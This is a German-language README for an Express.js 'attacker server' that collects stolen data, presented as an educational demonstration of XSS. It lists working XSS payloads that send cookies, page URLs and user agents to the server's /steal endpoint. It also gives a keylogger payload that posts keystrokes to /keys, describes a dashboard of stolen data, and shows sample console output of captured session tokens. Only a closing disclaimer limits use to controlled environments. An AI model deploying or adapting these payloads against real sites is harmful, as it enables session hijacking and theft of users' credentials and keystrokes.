# XSS Attacker Server

Ein einfacher Express.js Server zum Demonstrieren von XSS Cookie-Diebstahl und Keylogging für Bildungszwecke.

## Installation

1. Node.js muss installiert sein
2. Navigiere zum `attacker-server` Ordner:
   ```bash
   cd attacker-server
   ```

3. Installiere die Abhängigkeiten:
   ```bash
   npm install
   ```

## Server starten

```bash
npm start
```

Der Server läuft dann auf `http://localhost:3000`

## Dashboard aufrufen

Öffne im Browser: `http://localhost:3000/dashboard`

Hier siehst du alle gestohlenen Daten in Echtzeit (Auto-Refresh alle 5 Sekunden).

## Verwendung mit XSS Payloads

### Cookies stehlen (einfach)

```html
<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### Cookies stehlen (Image-Methode)

```html
<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
```

### Cookies + URL + UserAgent stehlen

```html
<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
```

### Keylogger

```html
<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
```

## Endpoints

- `GET /` - Hauptseite mit Infos
- `GET /dashboard` - Dashboard mit gestohlenen Daten
- `GET /steal?c=<cookies>` - Cookie-Diebstahl Endpoint
- `POST /steal` - Vollständige Daten (JSON: {c, u, a})
- `GET /keys?d=<keystrokes>` - Keylogger Endpoint
- `POST /clear` - Alle Daten löschen

## Wichtig

⚠️ **NUR FÜR BILDUNGSZWECKE!**

Dieser Server dient ausschließlich zu Lernzwecken in kontrollierten Umgebungen.
Verwende ihn niemals für echte Angriffe oder auf Produktionssystemen!

## Features

- ✅ CORS aktiviert für lokales Testing
- ✅ Echtzeit-Dashboard mit Auto-Refresh
- ✅ Verschiedene Steal-Methoden (GET/POST)
- ✅ Keylogger-Unterstützung
- ✅ Ausführliches Console-Logging
- ✅ Statistiken im Dashboard
- ✅ Daten können gelöscht werden

## Beispiel Output (Console)

```
═════════════════════════════════════════════════════

🚨 COOKIES GESTOHLEN! 🚨
═════════════════════════════════════════════════════
Zeitpunkt: 13.11.2025, 15:30:45
Cookies: sessionId=abc123; authToken=xyz789
IP: ::1
User-Agent: Mozilla/5.0 ...
═════════════════════════════════════════════════════
```
